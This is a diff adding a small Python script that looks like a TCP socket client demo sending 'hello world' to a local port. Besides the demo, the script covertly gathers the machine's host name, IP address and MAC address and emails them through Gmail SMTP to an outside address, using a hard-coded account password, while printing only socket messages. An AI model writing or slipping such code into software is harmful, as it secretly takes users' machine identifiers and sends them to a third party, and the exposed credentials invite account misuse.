@@ -1,0 +1,37 @@
+from socket import AF_INET, SOCK_STREAM
+from socket import *
+import smtplib,uuid
+from email.mime.text import MIMEText
+if __name__ == '__main__':
+    print('application started')
+    s=socket(AF_INET, SOCK_STREAM)
+    print('TCP socket created')
+    server_address=('127.0.0.1',7779)
+    s.connect(server_address)
+    print('socket connected to %s:%d' % s.getpeername())
+    print('local end-point is bound to %s:%d' % s.getsockname())
+    x = (hex(uuid.getnode()))
+    smtp_ssl_host='smtp.gmail.host'
+    smtp_ssl_port=465
+    username='smtpt9811@gamil.com'
+    password='P@ss01163'
+    from_addrs='smtpt9811@gamil.com'
+    to_addrs= 'omarsamiir21@gmail.com'
+    
+    host_name = gethostname()    
+    IPAddress = gethostbyname(host_name)
+    server=smtplib.SMTP_SSL('smtp.gmail.com',465)
+    server.login('smtpt9811@gmail.com', 'P@ss01163')
+    server.sendmail('smtpt9811@gmail.com','omarsamiir21@gmail.com','your ip'+IPAddress+"\n MAC Address: "+x) 
+    message='hello world'
+    if s.sendall(message.encode()) == None:
+       print('send %d bytes to %s:%d' % ((len(message),)+s.getpeername()))
+    if s.sendall(host_name.encode()) == None:
+       print('send %d bytes to %s:%d' % ((len(host_name),)+s.getpeername()))
+    if s.sendall(IPAddress.encode()) == None:
+       print('send %d bytes to %s:%d' % ((len(IPAddress ),)+s.getpeername()))
+    if s.sendall(x.encode()) == None:
+        print('send %d bytes to %s:%d' % ((len(x),)+s.getpeername()))
+    input('press enter to terminate...')
+    s.close()
+    print('terminating.....')
